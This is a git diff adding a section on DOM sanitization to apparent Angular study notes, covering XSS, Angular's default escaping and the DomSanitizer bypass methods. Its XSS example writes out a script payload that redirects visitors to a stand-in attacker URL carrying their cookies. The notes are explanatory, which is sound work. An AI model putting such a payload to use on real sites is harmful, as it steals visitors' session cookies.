@@ -164,6 +164,47 @@ These instructions will do work of creating correct DOM on their own. So we no l
 IVY ENGINE : Template HTML -> Template instructions -> DOM
 
 
+DOM Sanitization
+=========================
+Cross-site Scripting or XSS is probably the most common website security vulnerability. 
+It enables an attacker to inject client-side script into web pages viewed by other users.
+Example :
+  a. Every blog on the Internet has a comment’s system that allows users to comment on articles.
+     suppose that an attacker sends the following code as a “comment” to the server
+        <script>
+ 	   window.location=’http://attacker/?cookie='+document.cookie
+	</script>
+     If the website does not protect itself from Cross-site Scripting, this content will be saved to the database and 
+     all users visiting the page will redirect to the attacker URL.
+  b. Bind the src property of an Iframe (or a video)
+How Angular 2 protect us from XSS:
+  Angular treats all values as untrusted by default. 
+  When a value is inserted into the DOM from a template, via property, attribute, style, class binding, or interpolation, 
+  Angular sanitizes and escapes untrusted values.
+  Behind the scenes, Angular will sanitize the HTML input and escape the unsafe code.
+  i.e. The script will not run, only display on the screen as text.
+       Angular throwing error "unsafe value used in a resource URL context" because the <iframe src> attribute is a resource URL security context.
+Bypass Angular protection:
+  use the DomSanitizer service
+  - .sanitize(SecurityContext, value) | SecurityContext = SecurityContext.NONE, SecurityContext.HTML, SecurityContext.STYLE, SecurityContext.SCRIPT, SecurityContext.URL, SecurityContext.RESOURCE_URL
+  - .bypassSecurityTrustHtml(value)
+  - .bypassSecurityTrustStyle(value)
+  - .bypassSecurityTrustScript(value)
+  - .bypassSecurityTrustUrl(value)
+  - .bypassSecurityTrustResourceUrl(value)
+  import {BrowserModule, DomSanitizer} from '@angular/platform-browser';
+  a. export class App {
+      constructor(private sanitizer: DomSanitizer) {
+       this.html = sanitizer.bypassSecurityTrustHtml('<h1>DomSanitizer</h1><script>ourSafeCode()</script>') ;
+      }
+     }
+  b. export class App {
+      constructor(private sanitizer: DomSanitizer) {
+       this.iframe = sanitizer.bypassSecurityTrustResourceUrl("https://www.google.com")
+      }
+     }
+
+
 Angular 10, new stuff
 =========================
 1. Allows use of --strict flag while creating a new project
